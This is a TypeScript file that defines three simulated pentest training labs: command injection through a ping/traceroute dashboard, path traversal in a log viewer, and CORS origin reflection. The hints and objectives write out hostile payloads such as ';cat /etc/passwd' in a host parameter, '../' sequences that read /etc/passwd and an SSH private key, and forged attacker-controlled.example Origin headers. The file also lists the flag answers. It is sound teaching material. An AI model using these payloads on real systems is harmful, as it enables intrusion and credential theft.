import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** Three foundational offensive-web attack classes that, despite being extremely common in real bug
 *  bounty and pentest reports, weren't yet represented as their own dedicated labs on this platform:
 *  OS command injection, path traversal / LFI, and CORS misconfiguration. */
export const offensiveFreshAttacksLabs: LabScenario[] = [
  // 1 — Network: OS Command Injection
  {
    id: 'net-command-injection-ping-tool',
    title: 'Network: Command Injection via a Diagnostic Ping Utility',
    difficulty: 'Medium',
    category: 'Network',
    briefing:
      'Netops-diag09 exposes an internal "network diagnostics" dashboard with a ping-test feature — the kind of ' +
      'convenience tool that shows up in router, NAS, and firewall admin panels everywhere. The backend takes the ' +
      'hostname you submit and concatenates it directly into a shell command instead of passing it as a proper ' +
      'argument, meaning any shell metacharacter you include (;, &&, |, `) runs as a second command with the ' +
      'same privileges as the diagnostics service itself. This exact pattern — an admin "ping/traceroute" box ' +
      'shelling out unsanitized — is the root cause behind dozens of real disclosed CVEs in consumer and ' +
      'enterprise networking gear (D-Link, Netgear, and Zyxel devices among the most frequently cited).',
    objectives: [
      { text: 'nmap -sV 10.10.170.2', why: 'Confirms the diagnostics service and its port before probing it.' },
      { text: 'curl "http://10.10.170.2/api/diagnostics/ping?host=8.8.8.8"', why: 'Establishes the expected, benign ping-output response shape before attempting to break it.' },
      {
        text: 'curl "http://10.10.170.2/api/diagnostics/ping?host=8.8.8.8;cat /etc/passwd"',
        why: 'The semicolon is a shell command separator — if the backend builds its ping command by string concatenation instead of passing the hostname as a real argument, everything after the ; runs as a second, completely independent command.',
      },
      {
        text: 'Find the dashboard\'s traceroute tool and repeat the technique to leak an internal API key',
        why: 'A real command injection finding rarely stops at reading /etc/passwd for a proof-of-concept — the same dashboard almost always ships more than one diagnostic tool built the same insecure way, and finding a second injectable endpoint is what turns "I can run commands here" into "this whole class of tool on this box is compromised."',
      },
    ],
    hints: [
      'nmap -sV 10.10.170.2',
      'curl "http://10.10.170.2/api/diagnostics/ping?host=8.8.8.8"',
      'curl "http://10.10.170.2/api/diagnostics/ping?host=8.8.8.8;cat /etc/passwd"',
      'curl "http://10.10.170.2/api/diagnostics/traceroute?host=8.8.8.8;cat /opt/netops-diag/config.yml"',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'netops-diag09',
        ip: '10.10.170.2',
        os: 'Ubuntu 22.04 (internal network-ops dashboard)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Flask 2.3 dev server',
            http: {
              '/api/diagnostics/ping?host=8.8.8.8':
                'PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=12.4 ms\n\n--- 8.8.8.8 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss',
            },
            vulnRoutes: [
              {
                kind: 'command-injection',
                path: '/api/diagnostics/ping',
                param: 'host',
                triggerSubstrings: [';cat /etc/passwd', ';cat/etc/passwd'],
                vulnerableResponse:
                  'PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=12.4 ms\n' +
                  'root:x:0:0:root:/root:/bin/bash\nnetops:x:1000:1000::/home/netops:/bin/bash\n' +
                  'flag{command_injection_via_unsanitized_ping_host_param}',
                normalResponse: 'PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=12.4 ms',
              },
              {
                kind: 'command-injection',
                path: '/api/diagnostics/traceroute',
                param: 'host',
                triggerSubstrings: [';cat /opt/netops-diag/config.yml'],
                vulnerableResponse:
                  'traceroute to 8.8.8.8, 30 hops max\n 1  10.10.170.1  0.412 ms\n' +
                  'internal_api_key: "netops-diag-svc-a1b2c3d4e5f6"\ndashboard_admin_password: "N3tw0rkOps2026!"\n' +
                  'flag{command_injection_escalates_to_internal_api_key_leak}',
                normalResponse: 'traceroute to 8.8.8.8, 30 hops max\n 1  10.10.170.1  0.412 ms\n 2  * * *',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 2 — Web: Path Traversal / LFI
  {
    id: 'web-path-traversal-log-viewer',
    title: 'Web: Path Traversal to Read Arbitrary Local Files',
    difficulty: 'Medium',
    category: 'Web',
    briefing:
      'Supportdesk11\'s log-viewer feature lets a support agent read named application log files through a ' +
      '?file= parameter — but the backend joins that filename directly onto its logs directory with no ' +
      'validation that the result still lives inside it. Sequences of "../" walk straight back up the directory ' +
      'tree and out the other side, letting the parameter read any file the web process can access. Path ' +
      'traversal is one of the longest-running, most consistently reported bug classes in bug bounty history — ' +
      'it costs nothing to test (just a few "../" characters) and directly reads whatever secrets happen to sit ' +
      'on disk.',
    objectives: [
      { text: 'nmap -sV 10.10.171.2', why: 'Confirms the log-viewer service before probing the file parameter.' },
      { text: 'curl "http://10.10.171.2/logs/view?file=app.log"', why: 'Establishes the expected, in-bounds file-read behavior before attempting to escape the logs directory.' },
      {
        text: 'curl "http://10.10.171.2/logs/view?file=../../../../etc/passwd"',
        why: 'Each "../" walks one directory level up — enough of them from inside the logs directory reaches the filesystem root, then back down into /etc/passwd, proving the parameter isn\'t constrained to the intended directory at all.',
      },
      {
        text: 'Find the attachment-download endpoint and repeat the traversal against the application\'s own SSH private key',
        why: 'Reading /etc/passwd proves the bug exists; reading a private key the application process can access is what turns a path-traversal finding into an actual, usable foothold on the host — the difference bug bounty triage teams look for between "informational" and "critical." A second endpoint built the same insecure way is exactly how real reports escalate from one file read to a full foothold.',
      },
    ],
    hints: [
      'nmap -sV 10.10.171.2',
      'curl "http://10.10.171.2/logs/view?file=app.log"',
      'curl "http://10.10.171.2/logs/view?file=../../../../etc/passwd"',
      'curl "http://10.10.171.2/attachments/download?file=../../../../home/svcaccount/.ssh/id_rsa"',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'supportdesk11',
        ip: '10.10.171.2',
        os: 'Ubuntu 22.04 (PHP support-ticket log viewer)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Apache 2.4.54 (PHP 8.1)',
            http: {
              '/logs/view?file=app.log':
                '[2026-07-10 09:14:02] INFO Ticket #4471 created\n[2026-07-10 09:15:47] INFO Ticket #4471 assigned to agent 7\n[2026-07-10 09:20:03] INFO Ticket #4471 closed',
            },
            vulnRoutes: [
              {
                kind: 'path-traversal',
                path: '/logs/view',
                param: 'file',
                triggerSubstrings: ['../../../../etc/passwd', '..%2f..%2f..%2f..%2fetc%2fpasswd'],
                vulnerableResponse:
                  'root:x:0:0:root:/root:/bin/bash\nsvcaccount:x:1000:1000::/home/svcaccount:/bin/bash\n' +
                  'flag{path_traversal_reads_etc_passwd_via_dotdot_sequences}',
                normalResponse: '{"error":"File not found in logs directory"}',
              },
              {
                kind: 'path-traversal',
                path: '/attachments/download',
                param: 'file',
                triggerSubstrings: ['../../../../home/svcaccount/.ssh/id_rsa'],
                vulnerableResponse:
                  '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAFake==\n-----END OPENSSH PRIVATE KEY-----\n' +
                  'flag{path_traversal_escalates_to_ssh_private_key_disclosure}',
                normalResponse: '{"error":"Attachment not found"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 3 — Bug Bounty: CORS Misconfiguration
  {
    id: 'bb-cors-misconfiguration-credentials',
    title: 'Bug Bounty: CORS Misconfiguration Leaks Authenticated Session Data',
    difficulty: 'Medium',
    category: 'Bug Bounty',
    briefing:
      'Accountportal12\'s API reflects whatever Origin header a request sends straight back into the ' +
      'Access-Control-Allow-Origin response header — and pairs it with Access-Control-Allow-Credentials: true. ' +
      'Combined, that tells the browser "any website, using the victim\'s own cookies, may read this response" — ' +
      'the exact opposite of what CORS exists to prevent. A malicious page hosted anywhere can silently fetch an ' +
      'authenticated user\'s own account data the moment they visit it, no phishing of credentials required at ' +
      'all. This is one of PortSwigger Web Security Academy\'s own dedicated vulnerability categories and a ' +
      'frequently paid bug bounty finding for exactly this reason.',
    objectives: [
      { text: 'nmap -sV 10.10.172.2', why: 'Confirms the account API before probing its CORS behavior.' },
      { text: 'curl -i "http://10.10.172.2/api/account/details"', why: 'Establishes the baseline response and headers with no Origin header set at all.' },
      {
        text: 'curl -i -H "Origin: https://attacker-controlled.example" "http://10.10.172.2/api/account/details"',
        why: 'A correctly configured API should either omit Access-Control-Allow-Origin entirely for an untrusted origin, or echo back only an explicit allow-list — reflecting literally any Origin value back, combined with allow-credentials, means a victim\'s browser will let that attacker-controlled page read the response using the victim\'s own session cookie.',
      },
      {
        text: 'Reuse the same forged Origin header against the payment-methods endpoint',
        why: 'A misconfigured CORS header alone is a finding, but proving the same technique reaches an even more sensitive endpoint — stored payment details, not just a name and email — is what turns it into a critical, high-severity report instead of a low one.',
      },
    ],
    hints: [
      'nmap -sV 10.10.172.2',
      'curl -i "http://10.10.172.2/api/account/details"',
      'curl -i -H "Origin: https://attacker-controlled.example" "http://10.10.172.2/api/account/details"',
      'curl -i -H "Origin: https://attacker-controlled.example" "http://10.10.172.2/api/account/payment-methods"',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'accountportal12',
        ip: '10.10.172.2',
        os: 'Ubuntu 22.04 (Node.js account API)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js)',
            http: {
              '/api/account/details': '{"name":"Jordan Lee","email":"jordan.lee@meridiancorp.example","account_id":"acct-88213"}',
              '/api/account/payment-methods': '{"error":"401 Unauthorized"}',
            },
            vulnRoutes: [
              {
                kind: 'cors-misconfig',
                path: '/api/account/details',
                param: 'Origin',
                location: 'header',
                triggerSubstrings: ['attacker-controlled.example'],
                vulnerableResponse:
                  'Access-Control-Allow-Origin: https://attacker-controlled.example\n' +
                  'Access-Control-Allow-Credentials: true\n' +
                  '{"name":"Jordan Lee","email":"jordan.lee@meridiancorp.example","account_id":"acct-88213",' +
                  '"note":"flag{cors_misconfig_reflects_origin_with_credentials_allowed}"}',
                normalResponse: '{"name":"Jordan Lee","email":"jordan.lee@meridiancorp.example","account_id":"acct-88213"}',
              },
              {
                kind: 'cors-misconfig',
                path: '/api/account/payment-methods',
                param: 'Origin',
                location: 'header',
                triggerSubstrings: ['attacker-controlled.example'],
                vulnerableResponse:
                  'Access-Control-Allow-Origin: https://attacker-controlled.example\n' +
                  'Access-Control-Allow-Credentials: true\n' +
                  '{"cards":[{"last4":"4242","brand":"Visa"}],"note":"flag{cors_misconfig_escalates_to_stored_payment_data}"}',
                normalResponse: '{"error":"401 Unauthorized"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },
];
